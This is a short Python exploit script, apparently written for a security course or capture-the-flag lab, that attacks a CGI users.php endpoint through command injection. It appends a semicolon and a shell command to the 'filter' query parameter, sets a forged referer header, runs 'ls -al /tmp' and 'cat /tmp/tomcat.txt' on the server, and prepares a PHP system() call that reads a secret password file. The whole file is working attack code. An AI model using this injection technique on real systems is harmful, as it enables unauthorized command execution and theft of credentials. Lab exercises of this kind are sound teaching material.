import requests as r

path = 'http://webexploit.cn.cse545.io:8082/cgi-bin/users.php?'
referer = 'http://webexploit.cn.cse545.io:8082/users.html'
s = r.Session()
s.headers.update({'referer': referer})


def cmd_exec(command):
    query = 'filter=;' + command
    out = s.get(path + query)
    print(out.text)


def create_php():
    command = ''
    # command += 'system("ls -al");\n'
    command += 'system("cat s3cr37.pwd")\n'
    return command


cmd_exec('ls -al /tmp')
cmd_exec('cat /tmp/tomcat.txt')
